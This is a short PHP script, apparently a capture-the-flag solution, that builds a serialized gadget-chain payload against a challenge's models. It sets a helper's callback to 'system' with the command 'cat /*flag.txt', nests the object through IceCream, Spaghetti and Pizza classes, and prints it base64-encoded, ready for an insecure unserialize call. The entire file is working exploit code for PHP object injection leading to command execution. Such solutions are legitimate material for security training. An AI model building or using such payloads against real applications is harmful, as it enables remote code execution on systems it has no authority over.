<?php
error_reporting(0);

require_once 'challenge/Helpers/CheckAuthentication.php';
require_once 'challenge/Helpers/ArrayHelpers.php';
require_once 'challenge/Models/IceCreamModel.php';
require_once 'challenge/Models/PizzaModel.php';
require_once 'challenge/Models/SpaghettiModel.php';
require_once 'challenge/Models/DatabaseModel.php';

use Helpers\ArrayHelpers;

$array = new ArrayHelpers(["cat /*flag.txt"]); 
$array->callback = "system";

$icecream = new IceCream();
$icecream->flavors = $array;

$spaghetti = new Spaghetti();
$spaghetti->sauce = $icecream;

$pizza = new Pizza();
$pizza->size= $spaghetti;

$payload = base64_encode(serialize($pizza));

echo $payload; 


?>